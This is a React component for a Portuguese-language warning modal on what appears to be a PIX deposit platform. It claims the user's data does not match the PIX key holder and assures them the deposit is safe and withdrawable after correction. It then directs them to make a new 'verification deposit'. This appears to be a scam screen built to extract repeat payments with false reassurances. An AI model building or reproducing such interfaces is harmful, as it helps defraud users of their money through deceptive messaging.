import React from 'react';
import { AlertTriangle, Shield, ChevronRight } from 'lucide-react';

interface DataMismatchModalProps {
  isOpen: boolean;
  onReviewData: () => void;
  depositAmount: number;
}

export const DataMismatchModal: React.FC<DataMismatchModalProps> = ({
  isOpen,
  onReviewData,
  depositAmount
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/95 backdrop-blur-sm flex items-start justify-center p-3 z-[70] overflow-y-auto" style={{ paddingTop: '1rem', paddingBottom: '1rem' }}>
      <div className="bg-gray-900 rounded-2xl w-full max-w-sm shadow-2xl border border-orange-500/30 my-auto max-h-[90vh] overflow-hidden animate-scale-in flex flex-col">

        <div className="bg-gradient-to-br from-orange-500 to-orange-600 p-4 text-center relative overflow-hidden flex-shrink-0">
          <div className="absolute inset-0 bg-black/10"></div>
          <div className="relative z-10">
            <div className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
              <AlertTriangle className="w-7 h-7 text-white" />
            </div>
            <h2 className="text-xl font-bold text-white mb-1">Informacoes Divergentes</h2>
            <p className="text-white/90 text-xs">Verificamos inconsistencia nos dados</p>
          </div>
        </div>

        <div className="p-4 overflow-y-auto flex-1">
          <div className="bg-orange-50 border-2 border-orange-200 rounded-xl p-3 mb-3">
            <div className="flex items-start gap-2 mb-3">
              <div className="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center flex-shrink-0">
                <Shield className="w-4 h-4 text-white" />
              </div>
              <div className="flex-1">
                <h3 className="text-orange-900 font-bold text-sm mb-1">O que aconteceu?</h3>
                <p className="text-orange-800 text-xs leading-relaxed">
                  Detectamos que os dados cadastrados nao correspondem ao titular da chave PIX utilizada no deposito.
                </p>
              </div>
            </div>

            <div className="bg-white rounded-lg p-3 border border-orange-200 mb-3">
              <div className="flex items-center gap-1.5 mb-1">
                <div className="w-1.5 h-1.5 bg-orange-500 rounded-full"></div>
                <span className="text-orange-900 font-bold text-xs">Valor do deposito:</span>
              </div>
              <div className="text-xl font-bold text-orange-600 mb-0.5">
                R$ {depositAmount.toFixed(2).replace('.', ',')}
              </div>
              <p className="text-orange-700 text-[10px]">
                Este valor esta seguro e sera creditado apos correcao
              </p>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-2.5 mb-3">
              <h4 className="text-green-800 font-bold text-[10px] mb-1.5">NAO SE PREOCUPE</h4>
              <ul className="text-green-700 text-[10px] space-y-1">
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>Seu deposito foi recebido com sucesso</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>O valor sera creditado automaticamente</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>Voce podera sacar apos a correcao</span>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-blue-900 border border-blue-700 rounded-lg p-3 mb-3">
            <div className="flex items-start gap-2">
              <div className="w-7 h-7 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                <span className="text-white text-xs">💡</span>
              </div>
              <div>
                <h4 className="text-blue-200 font-bold text-xs mb-1.5">Como resolver?</h4>
                <p className="text-blue-300 text-[10px] leading-relaxed mb-2">
                  Revise seus dados cadastrais e corrija qualquer informacao incorreta. Em seguida, faca um novo deposito de verificacao com os dados corretos.
                </p>
                <div className="bg-blue-800/50 rounded-lg p-1.5">
                  <p className="text-blue-200 text-[10px] font-medium">
                    Os dados devem corresponder ao titular da chave PIX
                  </p>
                </div>
              </div>
            </div>
          </div>

          <button
            onClick={onReviewData}
            className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-3 rounded-xl hover:from-orange-600 hover:to-orange-700 transition-all duration-300 active:scale-95 shadow-modern text-sm"
            style={{ touchAction: 'manipulation' }}
          >
            <div className="flex items-center justify-center gap-2">
              <Shield className="w-4 h-4" />
              <span>REVISAR DADOS AGORA</span>
              <ChevronRight className="w-4 h-4" />
            </div>
          </button>

          <p className="text-center text-gray-400 text-[10px] mt-3 mb-2">
            Processo de seguranca obrigatorio para protecao da sua conta
          </p>
        </div>
      </div>
    </div>
  );
};
